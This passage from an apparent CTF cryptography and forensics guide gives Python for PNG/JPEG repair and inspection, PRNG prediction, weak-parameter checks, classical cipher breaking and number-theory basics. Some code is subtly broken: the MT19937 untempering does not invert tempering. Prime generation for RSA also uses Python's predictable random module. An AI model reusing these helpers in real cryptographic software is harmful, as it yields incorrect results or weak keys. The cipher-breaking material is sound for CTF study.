        # Replace width (bytes 0-3 of IHDR data)
        data[ihdr_data_pos:ihdr_data_pos+4] = struct.pack('>I', width)
    
    if height:
        # Replace height (bytes 4-7 of IHDR data)
        data[ihdr_data_pos+4:ihdr_data_pos+8] = struct.pack('>I', height)
    
    # Recalculate CRC for IHDR chunk
    ihdr_length = struct.unpack('>I', data[8:12])[0]
    ihdr_chunk = data[ihdr_pos:ihdr_pos+4+ihdr_length]
    new_crc = zlib.crc32(ihdr_chunk) & 0xffffffff
    crc_pos = ihdr_pos + 4 + ihdr_length
    data[crc_pos:crc_pos+4] = struct.pack('>I', new_crc)
    
    with open(output_path, 'wb') as f:
        f.write(data)
    
    return {'fixed': True, 'width': width, 'height': height}

def reconstruct_png_crc(png_path, output_path):
    """
    Recalculate all CRC values in PNG
    """
    with open(png_path, 'rb') as f:
        data = bytearray(f.read())
    
    if data[:8] != b'\x89PNG\r\n\x1a\n':
        return {'error': 'Not a valid PNG'}
    
    pos = 8
    chunks_fixed = 0
    
    while pos < len(data):
        # Read chunk
        length = struct.unpack('>I', data[pos:pos+4])[0]
        chunk_type = data[pos+4:pos+8]
        chunk_data = data[pos+8:pos+8+length]
        
        # Calculate correct CRC
        correct_crc = zlib.crc32(chunk_type + chunk_data) & 0xffffffff
        
        # Replace CRC
        crc_pos = pos + 8 + length
        data[crc_pos:crc_pos+4] = struct.pack('>I', correct_crc)
        chunks_fixed += 1
        
        # Move to next chunk
        pos += 12 + length
        
        # Stop at IEND
        if chunk_type == b'IEND':
            break
    
    with open(output_path, 'wb') as f:
        f.write(data)
    
    return {'chunks_fixed': chunks_fixed}
```

**JPEG Analysis**

```python
def extract_jpeg_comments(jpeg_path):
    """
    Extract comments from JPEG file
    JPEG uses markers: FF D8 (SOI), FF E0-EF (APP), FF FE (COM)
    """
    comments = []
    
    with open(jpeg_path, 'rb') as f:
        data = f.read()
    
    # Check JPEG signature
    if data[:2] != b'\xff\xd8':
        return {'error': 'Not a JPEG file'}
    
    pos = 2
    while pos < len(data) - 1:
        # Look for marker
        if data[pos] != 0xFF:
            pos += 1
            continue
        
        marker = data[pos+1]
        pos += 2
        
        # COM marker (0xFE)
        if marker == 0xFE:
            # Read length
            if pos + 2 <= len(data):
                length = struct.unpack('>H', data[pos:pos+2])[0]
                comment_data = data[pos+2:pos+length]
                try:
                    comment = comment_data.decode('utf-8', errors='ignore')
                    comments.append({
                        'type': 'COM',
                        'content': comment,
                        'offset': pos - 2
                    })
                except:
                    pass
                pos += length
        
        # APP markers (0xE0-0xEF) may contain data
        elif 0xE0 <= marker <= 0xEF:
            if pos + 2 <= len(data):
                length = struct.unpack('>H', data[pos:pos+2])[0]
                app_data = data[pos+2:pos+length]
                
                # Check for text data
                try:
                    text = app_data.decode('utf-8', errors='ignore')
                    if 'CTF{' in text or 'flag{' in text:
                        comments.append({
                            'type': f'APP{marker-0xE0}',
                            'content': text,
                            'offset': pos - 2
                        })
                except:
                    pass
                
                pos += length
        else:
            pos += 1
    
    return {'comments': comments}

def jpeg_end_of_file_data(jpeg_path):
    """
    Check for data appended after JPEG EOI marker (FF D9)
    """
    with open(jpeg_path, 'rb') as f:
        data = f.read()
    
    # Find EOI marker
    eoi_pos = data.rfind(b'\xff\xd9')
    
    if eoi_pos == -1:
        return {'error': 'No EOI marker found'}
    
    # Check if there's data after EOI
    trailing_data = data[eoi_pos+2:]
    
    if len(trailing_data) > 0:
        try:
            text = trailing_data.decode('utf-8', errors='ignore')
            return {
                'has_trailing_data': True,
                'length': len(trailing_data),
                'text': text,
                'hex': trailing_data[:100].hex()
            }
        except:
            return {
                'has_trailing_data': True,
                'length': len(trailing_data),
                'binary': trailing_data[:100].hex()
            }
    
    return {'has_trailing_data': False}
```

#### Modified Algorithm Parameters

**Weak Random Number Generator Detection**

```python
import random
import time

def detect_weak_prng(outputs):
    """
    Detect if outputs come from Python's random (Mersenne Twister)
    or other weak PRNGs
    """
    # Test for linear patterns
    differences = [outputs[i+1] - outputs[i] for i in range(len(outputs)-1)]
    
    # Check for LCG patterns
    if len(outputs) >= 3:
        # Try to detect LCG: x_n+1 = (a*x_n + c) mod m
        possible_lcg = detect_lcg_parameters(outputs)
        if possible_lcg:
            return {
                'prng_type': 'LCG',
                'parameters': possible_lcg,
                'predictable': True
            }
    
    # Check for MT19937 patterns
    if len(outputs) >= 624:
        return {
            'prng_type': 'Possible MT19937',
            'note': 'Can recover state from 624 outputs',
            'predictable': True
        }
    
    return {'prng_type': 'Unknown', 'predictable': False}

def detect_lcg_parameters(outputs):
    """
    Attempt to detect LCG parameters from output sequence
    """
    if len(outputs) < 3:
        return None
    
    # Assume modulus is power of 2 (common)
    for m_bits in [32, 31, 16]:
        m = 2 ** m_bits
        
        # Try to solve for a and c
        # x1 = (a*x0 + c) mod m
        # x2 = (a*x1 + c) mod m
        # x2 - x1 = a*(x1 - x0) mod m
        
        try:
            x0, x1, x2 = outputs[0], outputs[1], outputs[2]
            
            if (x1 - x0) % m == 0:
                continue
            
            # Calculate a
            a = ((x2 - x1) * pow(x1 - x0, -1, m)) % m
            
            # Calculate c
            c = (x1 - a * x0) % m
            
            # Verify with next values
            correct = True
            for i in range(len(outputs) - 1):
                predicted = (a * outputs[i] + c) % m
                if predicted != outputs[i+1]:
                    correct = False
                    break
            
            if correct:
                return {'a': a, 'c': c, 'm': m}
        except:
            continue
    
    return None

def predict_mt19937_state(outputs):
    """
    Recover MT19937 state from 624 outputs
    """
    if len(outputs) < 624:
        return None
    
    state = []
    for output in outputs[:624]:
        # Untemper the output
        value = mt19937_untemper(output)
        state.append(value)
    
    # Create RNG with recovered state
    # [Inference] This demonstrates concept; full implementation needs MT19937 internals
    return {
        'state_recovered': True,
        'state': state,
        'note': 'Can now predict future outputs'
    }

def mt19937_untemper(y):
    """Reverse MT19937 tempering (from previous section)"""
    y = y ^ (y >> 18)
    y = y ^ ((y << 15) & 0xefc60000)
    for _ in range(4):
        y = y ^ ((y << 7) & 0x9d2c5680)
    y = y ^ (y >> 11)
    y = y ^ (y >> 11)
    return y & 0xffffffff
```

**Weak Key Detection**

```python
def detect_weak_crypto_params(params):
    """
    Detect common weak cryptographic parameters in CTFs
    """
    issues = []
    
    # Check RSA parameters
    if 'n' in params and 'e' in params:
        n, e = params['n'], params['e']
        
        # Small exponent
        if e < 65537:
            issues.append({
                'param': 'RSA e',
                'issue': f'e={e} is too small',
                'attack': 'Small exponent attack'
            })
        
        # Small modulus
        n_bits = n.bit_length()
        if n_bits < 512:
            issues.append({
                'param': 'RSA n',
                'issue': f'n is only {n_bits} bits',
                'attack': 'Factorization (GNFS, CADO-NFS)'
            })
        elif n_bits < 1024:
            issues.append({
                'param': 'RSA n',
                'issue': f'n is {n_bits} bits (weak by modern standards)',
                'attack': 'Possible with significant resources'
            })
        
        # Check if n is even
        if n % 2 == 0:
            issues.append({
                'param': 'RSA n',
                'issue': 'n is even',
                'attack': 'Trivially factor as 2 * (n/2)'
            })
        
        # Check for small factors
        small_primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47]
        for p in small_primes:
            if n % p == 0:
                issues.append({
                    'param': 'RSA n',
                    'issue': f'n divisible by {p}',
                    'attack': f'Factor: {p} * {n//p}'
                })
    
    # Check AES parameters
    if 'aes_key' in params:
        key = params['aes_key']
        key_bits = len(key) * 8
        
        if key_bits < 128:
            issues.append({
                'param': 'AES key',
                'issue': f'Key is only {key_bits} bits',
                'attack': 'Brute force feasible'
            })
        
        # Check for weak keys (all zeros, all ones, repeating pattern)
        if key == b'\x00' * len(key):
            issues.append({
                'param': 'AES key',
                'issue': 'Key is all zeros',
                'attack': 'Known weak key'
            })
        elif key == b'\xff' * len(key):
            issues.append({
                'param': 'AES key',
                'issue': 'Key is all ones',
                'attack': 'Known weak key'
            })
        elif len(set(key)) <= 2:
            issues.append({
                'param': 'AES key',
                'issue': 'Key has very low entropy',
                'attack': 'Pattern-based attack'
            })
    
    # Check IV/nonce
    if 'iv' in params:
        iv = params['iv']
        if iv == b'\x00' * len(iv):
            issues.append({
                'param': 'IV',
                'issue': 'IV is all zeros',
                'attack': 'Predictable IV attack'
            })
    
    return issues

def analyze_cipher_implementation(ciphertext, known_plaintext=None):
    """
    Analyze ciphertext for implementation weaknesses
    """
    analysis = {
        'length': len(ciphertext),
        'entropy': calculate_entropy(ciphertext),
        'patterns': []
    }
    
    # Check for repeating blocks (ECB mode indicator)
    block_sizes = [8, 16, 32]
    for block_size in block_sizes:
        if len(ciphertext) >= block_size * 2:
            blocks = [ciphertext[i:i+block_size] 
                     for i in range(0, len(ciphertext), block_size)]
            unique_blocks = len(set(blocks))
            total_blocks = len(blocks)
            
            if unique_blocks < total_blocks:
                analysis['patterns'].append({
                    'type': 'Repeating blocks',
                    'block_size': block_size,
                    'unique': unique_blocks,
                    'total': total_blocks,
                    'likely_mode': 'ECB',
                    'weakness': 'Block reordering possible'
                })
    
    # Check for low entropy (possible weak encryption)
    if analysis['entropy'] < 4.0:
        analysis['patterns'].append({
            'type': 'Low entropy',
            'value': analysis['entropy'],
            'weakness': 'Possible XOR or substitution cipher'
        })
    
    # Check for null bytes
    null_count = ciphertext.count(b'\x00')
    if null_count > len(ciphertext) * 0.1:
        analysis['patterns'].append({
            'type': 'High null byte count',
            'count': null_count,
            'percentage': (null_count / len(ciphertext)) * 100,
            'weakness': 'Possible incomplete encryption or padding'
        })
    
    return analysis
```

**Custom Caesar with Offset**

```python
def custom_caesar_variants():
    """
    Common CTF variations of Caesar cipher
    """
    
    def caesar_with_key(text, key):
        """Caesar cipher where shift = sum of key characters"""
        shift = sum(ord(c) for c in key) % 26
        return caesar_shift(text, shift)
    
    def caesar_shift(text, shift):
        """Helper for Caesar shift"""
        result = []
        for char in text:
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + shift) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + shift) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)
    
    def vigenere_caesar_hybrid(text, key):
        """Vigenere-style but with Caesar shifts"""
        result = []
        key_index = 0
        
        for char in text:
            if char.isalpha():
                shift = ord(key[key_index % len(key)].upper()) - ord('A')
                if 'a' <= char <= 'z':
                    result.append(chr((ord(char) - ord('a') + shift) % 26 + ord('a')))
                else:
                    result.append(chr((ord(char) - ord('A') + shift) % 26 + ord('A')))
                key_index += 1
            else:
                result.append(char)
        
        return ''.join(result)
    
    def affine_cipher(text, a, b):
        """
        Affine cipher: E(x) = (ax + b) mod 26
        a must be coprime with 26
        """
        import math
        
        if math.gcd(a, 26) != 1:
            return "Invalid 'a' parameter (must be coprime with 26)"
        
        result = []
        for char in text:
            if 'a' <= char <= 'z':
                x = ord(char) - ord('a')
                encrypted = (a * x + b) % 26
                result.append(chr(encrypted + ord('a')))
            elif 'A' <= char <= 'Z':
                x = ord(char) - ord('A')
                encrypted = (a * x + b) % 26
                result.append(chr(encrypted + ord('A')))
            else:
                result.append(char)
        
        return ''.join(result)
    
    def break_affine_cipher(ciphertext, known_plaintext_pairs):
        """
        Break affine cipher with known plaintext
        Need at least 2 character pairs
        """
        if len(known_plaintext_pairs) < 2:
            return None
        
        # Convert to numbers
        p1 = ord(known_plaintext_pairs[0][0].upper()) - ord('A')
        c1 = ord(known_plaintext_pairs[0][1].upper()) - ord('A')
        p2 = ord(known_plaintext_pairs[1][0].upper()) - ord('A')
        c2 = ord(known_plaintext_pairs[1][1].upper()) - ord('A')
        
        # Solve: c1 = a*p1 + b (mod 26)
        #        c2 = a*p2 + b (mod 26)
        # Therefore: c1 - c2 = a*(p1 - p2) (mod 26)
        
        try:
            a = ((c1 - c2) * pow(p1 - p2, -1, 26)) % 26
            b = (c1 - a * p1) % 26
            
            return {'a': a, 'b': b}
        except:
            return None
    
    return {
        'caesar_with_key': caesar_with_key,
        'vigenere_hybrid': vigenere_caesar_hybrid,
        'affine': affine_cipher,
        'break_affine': break_affine_cipher
    }
```

**Modified Base64 Tables**

```python
def detect_custom_base64_table(encoded, known_plain=None):
    """
    Detect and recover custom Base64 alphabet
    """
    standard_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    if known_plain:
        # Use known plaintext to derive table
        import base64
        standard_encoded = base64.b64encode(known_plain).decode()
        
        # Build character mapping
        custom_table = list(standard_table)
        
        for i, (custom_char, standard_char) in enumerate(zip(encoded, standard_encoded)):
            if custom_char != standard_char:
                # Find positions
                std_pos = standard_table.index(standard_char)
                custom_table[std_pos] = custom_char
        
        return ''.join(custom_table)
    
    # Without known plaintext, look for patterns
    char_freq = {}
    for char in encoded:
        char_freq[char] = char_freq.get(char, 0) + 1
    
    return {
        'note': 'Need known plaintext to fully recover table',
        'character_frequency': sorted(char_freq.items(), key=lambda x: x[1], reverse=True)
    }
```

### CTF Cipher Identification Tool

```python
def identify_cipher(ciphertext):
    """
    Automated cipher identification for CTF challenges
    """
    identifications = []
    
    # Convert to string if bytes
    if isinstance(ciphertext, bytes):
        ct_str = ciphertext.decode('latin-1', errors='ignore')
    else:
        ct_str = ciphertext
    
    # Check Base64
    try:
        import base64
        import re
        if re.match(r'^[A-Za-z0-9+/]+={0,2}$', ct_str.strip()):
            decoded = base64.b64decode(ct_str)
            identifications.append({
                'type': 'Base64',
                'confidence': 'high',
                'decoded_preview': decoded[:50].hex()
            })
    except:
        pass
    
    # Check Hex
    try:
        if all(c in '0123456789abcdefABCDEF ' for c in ct_str):
            decoded = bytes.fromhex(ct_str.replace(' ', ''))
            identifications.append({
                'type': 'Hexadecimal',
                'confidence': 'high',
                'decoded_preview': decoded[:50]
            })
    except:
        pass
    
    # Check Caesar/ROT
    if ct_str.isalpha():
        best_caesar = caesar_bruteforce(ct_str)
        if best_caesar[0]['score'] > 5:
            identifications.append({
                'type': f"Caesar/ROT{best_caesar[0]['shift']}",
                'confidence': 'medium',
                'result': best_caesar[0]['plaintext']
            })
    
    # Check for repeating blocks (ECB)
    if isinstance(ciphertext, bytes) and len(ciphertext) >= 32:
        for block_size in [8, 16]:
            blocks = [ciphertext[i:i+block_size] 
                     for i in range(0, len(ciphertext), block_size)]
            if len(blocks) != len(set(blocks)):
                identifications.append({
                    'type': 'Block cipher (likely ECB mode)',
                    'confidence': 'medium',
                    'block_size': block_size
                })
    
    # Check entropy
    entropy = calculate_entropy(ciphertext if isinstance(ciphertext, bytes) else ct_str.encode())
    if entropy < 4.0:
        identifications.append({
            'type': 'Low entropy (substitution/XOR)',
            'confidence': 'low',
            'entropy': entropy
        })
    elif entropy > 7.5:
        identifications.append({
            'type': 'High entropy (strong cipher or compressed)',
            'confidence': 'low',
            'entropy': entropy
        })
    
    return identifications
```

**Disclaimer:** [Inference] The effectiveness of these techniques depends on specific CTF challenge design. Success rates vary based on implementation details, key parameters, and available information.

[Unverified] Tool commands assume standard installations. Verify tool availability and version compatibility in your environment.

---

# MATHEMATICAL FOUNDATIONS (REFERENCE)

## Number Theory Basics

### Modular Arithmetic

Modular arithmetic is the foundation of modern cryptography, particularly in RSA, Diffie-Hellman, and elliptic curve cryptography. It operates on the principle of remainders after division, where computations "wrap around" after reaching a modulus value.

**Fundamental Concepts**

```python
#!/usr/bin/env python3

# Basic modular operations
def mod_add(a, b, n):
    """Addition: (a + b) mod n"""
    return (a + b) % n

def mod_sub(a, b, n):
    """Subtraction: (a - b) mod n"""
    return (a - b) % n

def mod_mul(a, b, n):
    """Multiplication: (a * b) mod n"""
    return (a * b) % n

def mod_pow(base, exp, n):
    """Modular exponentiation: (base^exp) mod n
    Uses Python's built-in pow() which implements fast exponentiation
    """
    return pow(base, exp, n)

# Examples
print(f"15 + 23 ≡ {mod_add(15, 23, 17)} (mod 17)")  # 4
print(f"5 - 8 ≡ {mod_sub(5, 8, 13)} (mod 13)")      # 10
print(f"7 * 9 ≡ {mod_mul(7, 9, 11)} (mod 11)")      # 8
print(f"3^100 ≡ {mod_pow(3, 100, 7)} (mod 7)")      # 4
```

**Properties of Modular Arithmetic**

```python
#!/usr/bin/env python3

def demonstrate_properties(a, b, c, n):
    """
    Demonstrate fundamental properties of modular arithmetic
    """
    print(f"Testing with a={a}, b={b}, c={c}, n={n}\n")
    
    # Commutative property
    assert (a + b) % n == (b + a) % n
    assert (a * b) % n == (b * a) % n
    print("[✓] Commutative property holds")
    
    # Associative property
    assert ((a + b) + c) % n == (a + (b + c)) % n
    assert ((a * b) * c) % n == (a * (b * c)) % n
    print("[✓] Associative property holds")
    
    # Distributive property
    assert (a * (b + c)) % n == ((a * b) + (a * c)) % n
    print("[✓] Distributive property holds")
    
    # Identity elements
    assert (a + 0) % n == a % n  # Additive identity
    assert (a * 1) % n == a % n  # Multiplicative identity
    print("[✓] Identity elements verified")
    
    # Inverse existence (for coprime elements)
    from math import gcd
    if gcd(a, n) == 1:
        # Multiplicative inverse exists
        inv = pow(a, -1, n)  # Python 3.8+
        assert (a * inv) % n == 1
        print(f"[✓] Multiplicative inverse of {a} mod {n} is {inv}")

demonstrate_properties(7, 11, 13, 23)
```

**Modular Inverse**

```python
#!/usr/bin/env python3

def mod_inverse_fermat(a, p):
    """
    Compute modular inverse using Fermat's Little Theorem
    Only works when p is prime
    a^(-1) ≡ a^(p-2) (mod p)
    """
    if p <= 2:
        return None
    return pow(a, p - 2, p)

def mod_inverse_extended_gcd(a, n):
    """
    Compute modular inverse using Extended Euclidean Algorithm
    Works for any n where gcd(a, n) = 1
    """
    def extended_gcd(a, b):
        if a == 0:
            return b, 0, 1
        gcd, x1, y1 = extended_gcd(b % a, a)
        x = y1 - (b // a) * x1
        y = x1
        return gcd, x, y
    
    gcd, x, _ = extended_gcd(a % n, n)
    if gcd != 1:
        return None  # Inverse doesn't exist
    return (x % n + n) % n

def mod_inverse_python(a, n):
    """
    Use Python 3.8+ built-in modular inverse
    """
    try:
        return pow(a, -1, n)
    except ValueError:
        return None  # Inverse doesn't exist

# Examples
a, n = 7, 26
print(f"Inverse of {a} mod {n}:")
print(f"  Extended GCD method: {mod_inverse_extended_gcd(a, n)}")  # 15
print(f"  Python built-in: {mod_inverse_python(a, n)}")  # 15
print(f"  Verification: {a} * {mod_inverse_python(a, n)} ≡ {(a * mod_inverse_python(a, n)) % n} (mod {n})")

# For prime modulus
a, p = 3, 17
print(f"\nInverse of {a} mod {p} (prime):")
print(f"  Fermat's method: {mod_inverse_fermat(a, p)}")  # 6
print(f"  Verification: {a} * {mod_inverse_fermat(a, p)} ≡ {(a * mod_inverse_fermat(a, p)) % p} (mod {p})")
```

**Fast Modular Exponentiation**

```python
#!/usr/bin/env python3

def mod_pow_manual(base, exp, mod):
    """
    Manual implementation of fast modular exponentiation
    Uses square-and-multiply algorithm (binary exponentiation)
    """
    if mod == 1:
        return 0
    
    result = 1
    base = base % mod
    
    while exp > 0:
        # If exp is odd, multiply base with result
        if exp % 2 == 1:
            result = (result * base) % mod
        
        # Square the base
        base = (base * base) % mod
        
        # Divide exp by 2
        exp = exp >> 1  # Right shift (divide by 2)
    
    return result

def mod_pow_binary_string(base, exp, mod):
    """
    Modular exponentiation using binary representation
    More explicit demonstration of the algorithm
    """
    result = 1
    base = base % mod
    
    # Convert exponent to binary string
    exp_binary = bin(exp)[2:]  # Remove '0b' prefix
    
    print(f"Computing {base}^{exp} mod {mod}")
    print(f"Binary representation of {exp}: {exp_binary}")
    
    for i, bit in enumerate(exp_binary):
        result = (result * result) % mod
        if bit == '1':
            result = (result * base) % mod
        print(f"  Step {i+1} (bit={bit}): result = {result}")
    
    return result

# Compare implementations
base, exp, mod = 3, 100, 7
print(f"\nManual implementation: {mod_pow_manual(base, exp, mod)}")
print(f"Python built-in: {pow(base, exp, mod)}")
print(f"\nDetailed computation:")
mod_pow_binary_string(base, 13, 17)
```

**Modular Division**

```python
#!/usr/bin/env python3

def mod_div(a, b, n):
    """
    Modular division: (a / b) mod n
    Equivalent to: (a * b^(-1)) mod n
    """
    b_inv = pow(b, -1, n)
    return (a * b_inv) % n

# Example
a, b, n = 15, 4, 17
result = mod_div(a, b, n)
print(f"{a} / {b} ≡ {result} (mod {n})")
print(f"Verification: {b} * {result} ≡ {(b * result) % n} (mod {n})")
```

**Solving Linear Congruences**

```python
#!/usr/bin/env python3
from math import gcd

def solve_linear_congruence(a, b, n):
    """
    Solve: ax ≡ b (mod n)
    Returns all solutions in range [0, n)
    """
    g = gcd(a, n)
    
    if b % g != 0:
        print(f"No solution exists (gcd({a}, {n}) = {g} does not divide {b})")
        return []
    
    # Reduce to simpler congruence
    a_reduced = a // g
    b_reduced = b // g
    n_reduced = n // g
    
    # Find one solution
    a_inv = pow(a_reduced, -1, n_reduced)
    x0 = (b_reduced * a_inv) % n_reduced
    
    # Generate all solutions
    solutions = [(x0 + i * n_reduced) % n for i in range(g)]
    
    return sorted(solutions)

# Examples
print("Solve: 3x ≡ 6 (mod 9)")
solutions = solve_linear_congruence(3, 6, 9)
print(f"Solutions: {solutions}")
for x in solutions:
    print(f"  Verification: 3 * {x} ≡ {(3 * x) % 9} (mod 9)")

print("\nSolve: 5x ≡ 11 (mod 17)")
solutions = solve_linear_congruence(5, 11, 17)
print(f"Solutions: {solutions}")
```

**CTF Application: Breaking Simple Cipher**

```python
#!/usr/bin/env python3

def affine_decrypt(ciphertext, a, b, m=26):
    """
    Decrypt affine cipher: D(x) = a^(-1)(x - b) mod m
    E(x) = (ax + b) mod m
    """
    a_inv = pow(a, -1, m)
    plaintext = ""
    
    for char in ciphertext:
        if char.isalpha():
            # Convert to number (A=0, B=1, ...)
            x = ord(char.upper()) - ord('A')
            
            # Decrypt
            p = (a_inv * (x - b)) % m
            
            # Convert back to character
            plaintext += chr(p + ord('A'))
        else:
            plaintext += char
    
    return plaintext

# CTF scenario: encrypted flag with affine cipher
ciphertext = "IHHM{CPFNYXFSI}"
# Known: uses affine cipher with m=26
# Try all possible keys (brute force)

print("Brute forcing affine cipher:")
for a in [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25]:  # Coprime with 26
    for b in range(26):
        plaintext = affine_decrypt(ciphertext, a, b)
        if "FLAG" in plaintext:
            print(f"[+] Found key: a={a}, b={b}")
            print(f"    Plaintext: {plaintext}")
```

**Discrete Logarithm Problem (Foundation)**

```python
#!/usr/bin/env python3

def baby_step_giant_step(g, h, p):
    """
    Solve discrete logarithm: g^x ≡ h (mod p)
    Using Baby-step Giant-step algorithm
    Time complexity: O(√p)
    """
    import math
    
    n = int(math.ceil(math.sqrt(p - 1)))
    
    # Baby step: compute g^j for j = 0, 1, ..., n-1
    table = {}
    power = 1
    for j in range(n):
        table[power] = j
        power = (power * g) % p
    
    # Giant step: compute h * (g^(-n))^i for i = 0, 1, ..., n-1
    g_inv_n = pow(g, -n, p)
    gamma = h
    
    for i in range(n):
        if gamma in table:
            j = table[gamma]
            x = i * n + j
            return x
        gamma = (gamma * g_inv_n) % p
    
    return None

# Example
g, h, p = 5, 33, 47
x = baby_step_giant_step(g, h, p)
print(f"Discrete log: {g}^{x} ≡ {h} (mod {p})")
print(f"Verification: {g}^{x} ≡ {pow(g, x, p)} (mod {p})")
```

**Quadratic Residues**

```python
#!/usr/bin/env python3

def legendre_symbol(a, p):
    """
    Compute Legendre symbol (a/p)
    Returns: 1 if a is quadratic residue mod p
            -1 if a is not quadratic residue mod p
             0 if a ≡ 0 (mod p)
    """
    ls = pow(a, (p - 1) // 2, p)
    return -1 if ls == p - 1 else ls

def tonelli_shanks(n, p):
    """
    Solve x^2 ≡ n (mod p) using Tonelli-Shanks algorithm
    Returns one square root (the other is p - root)
    """
    if legendre_symbol(n, p) != 1:
        return None  # No solution
    
    if p % 4 == 3:
        # Simple case
        return pow(n, (p + 1) // 4, p)
    
    # Factor p-1 = Q * 2^S
    Q, S = p - 1, 0
    while Q % 2 == 0:
        Q //= 2
        S += 1
    
    # Find quadratic non-residue
    z = 2
    while legendre_symbol(z, p) != -1:
        z += 1
    
    # Initialize
    M = S
    c = pow(z, Q, p)
    t = pow(n, Q, p)
    R = pow(n, (Q + 1) // 2, p)
    
    while t != 1:
        # Find least i such that t^(2^i) = 1
        i = 1
        temp = (t * t) % p
        while temp != 1:
            temp = (temp * temp) % p
            i += 1
        
        # Update values
        b = pow(c, 1 << (M - i - 1), p)
        M = i
        c = (b * b) % p
        t = (t * c) % p
        R = (R * b) % p
    
    return R

# Example
n, p = 10, 13
root = tonelli_shanks(n, p)
if root:
    print(f"Square root of {n} mod {p}: {root}")
    print(f"Verification: {root}^2 ≡ {pow(root, 2, p)} (mod {p})")
    print(f"Other root: {p - root}")
```

**CTF Tools Integration**

```bash
# SageMath for advanced modular arithmetic
apt-get install sagemath

# SageMath example
sage << 'EOF'
# Modular arithmetic in SageMath
R = Integers(17)
a = R(5)
b = R(7)

print(f"5 + 7 = {a + b}")
print(f"5 * 7 = {a * b}")
print(f"5^(-1) = {a^(-1)}")
print(f"Solve 5x = 7: x = {7 * a^(-1)}")
EOF
```

---

### Prime Numbers & Primality Testing

Prime numbers are fundamental to cryptographic algorithms, particularly RSA and discrete logarithm-based systems. Efficient primality testing determines whether large numbers are prime without full factorization.

**Trial Division**

```python
#!/usr/bin/env python3
import math

def is_prime_trial_division(n):
    """
    Basic primality test using trial division
    Time complexity: O(√n)
    Practical only for small numbers (< 10^12)
    """
    if n < 2:
        return False
    if n == 2:
        return True
    if n % 2 == 0:
        return False
    
    # Check odd divisors up to √n
    for i in range(3, int(math.sqrt(n)) + 1, 2):
        if n % i == 0:
            return False
    
    return True

# Test
numbers = [2, 17, 561, 1009, 1024]
for n in numbers:
    print(f"{n}: {'Prime' if is_prime_trial_division(n) else 'Composite'}")
```

**Fermat Primality Test**

```python
#!/usr/bin/env python3
import random

def fermat_test(n, k=5):
    """
    Fermat primality test (probabilistic)
    Based on Fermat's Little Theorem: a^(p-1) ≡ 1 (mod p) for prime p
    
    k: number of iterations (higher = more accurate)
    Returns: True if probably prime, False if definitely composite
    
    [Inference] Carmichael numbers are false positives
    """
    if n < 2:
        return False
    if n == 2 or n == 3:
        return True
    if n % 2 == 0:
        return False
    
    for _ in range(k):
        a = random.randint(2, n - 2)
        if pow(a, n - 1, n) != 1:
            return False  # Definitely composite
    
    return True  # Probably prime

# Test
test_numbers = [561, 1105, 1729]  # Carmichael numbers (false positives)
for n in test_numbers:
    print(f"{n}: Fermat test says {'probably prime' if fermat_test(n) else 'composite'}")
    print(f"     Actually: {'prime' if is_prime_trial_division(n) else 'composite'}")
```

**Miller-Rabin Primality Test**

```python
#!/usr/bin/env python3
import random

def miller_rabin(n, k=40):
    """
    Miller-Rabin primality test (probabilistic)
    More reliable than Fermat test; no Carmichael number problem
    
    k: number of rounds (k=40 gives error probability < 2^(-80))
    """
    if n < 2:
        return False
    if n == 2 or n == 3:
        return True
    if n % 2 == 0:
        return False
    
    # Write n-1 as 2^r * d
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1
        d //= 2
    
    # Witness loop
    for _ in range(k):
        a = random.randint(2, n - 2)
        x = pow(a, d, n)
        
        if x == 1 or x == n - 1:
            continue
        
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False  # Definitely composite
    
    return True  # Probably prime

# Test on large numbers
large_prime = 2**89 - 1  # Mersenne prime
print(f"{large_prime}: {'Probably prime' if miller_rabin(large_prime) else 'Composite'}")

# Test on Carmichael numbers
carmichael = 561
print(f"{carmichael}: Miller-Rabin says {'probably prime' if miller_rabin(carmichael) else 'composite'}")
print(f"            Actually: {'prime' if is_prime_trial_division(carmichael) else 'composite'}")
```

**Deterministic Primality Testing (Small Primes)**

```python
#!/usr/bin/env python3

def is_prime_deterministic(n):
    """
    Deterministic Miller-Rabin for n < 3,317,044,064,679,887,385,961,981
    Uses specific witness set that guarantees correctness
    """
    if n < 2:
        return False
    if n == 2 or n == 3:
        return True
    if n % 2 == 0:
        return False
    
    # Deterministic witnesses for different ranges
    if n < 2047:
        witnesses = [2]
    elif n < 1373653:
        witnesses = [2, 3]
    elif n < 9080191:
        witnesses = [31, 73]
    elif n < 25326001:
        witnesses = [2, 3, 5]
    elif n < 3215031751:
        witnesses = [2, 3, 5, 7]
    elif n < 4759123141:
        witnesses = [2, 7, 61]
    elif n < 1122004669633:
        witnesses = [2, 13, 23, 1662803]
    elif n < 2152302898747:
        witnesses = [2, 3, 5, 7, 11]
    elif n < 3474749660383:
        witnesses = [2, 3, 5, 7, 11, 13]
    elif n < 341550071728321:
        witnesses = [2, 3, 5, 7, 11, 13, 17]
    else:
        witnesses = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37]
    
    # Miller-Rabin with specific witnesses
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1
        d //= 2
    
    for a in witnesses:
        if a >= n:
            continue
        
        x = pow(a, d, n)
        if x == 1 or x == n - 1:
            continue
        
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    
    return True

# Test
test_primes = [2, 3, 5, 7, 11, 97, 997, 9973, 104729, 1299709]
for p in test_primes:
    print(f"{p}: {is_prime_deterministic(p)}")
```

**Prime Generation**

```python
#!/usr/bin/env python3
import random

def generate_prime(bits):
    """
    Generate a random prime number of specified bit length
    Used in RSA key generation
    """
    while True:
        # Generate random odd number
        n = random.getrandbits(bits)
        n |= (1 << bits - 1) | 1  # Set MSB and LSB to 1
        
        # Test primality
        if miller_rabin(n, k=40):
            return n

def generate_safe_prime(bits):
    """
    Generate safe prime p where (p-1)/2 is also prime
    Used in Diffie-Hellman and DSA
    """
    while True:
        # Generate prime q
        q = generate_prime(bits - 1)
        
        # Compute p = 2q + 1
        p = 2 * q + 1
        
        # Test if p is prime
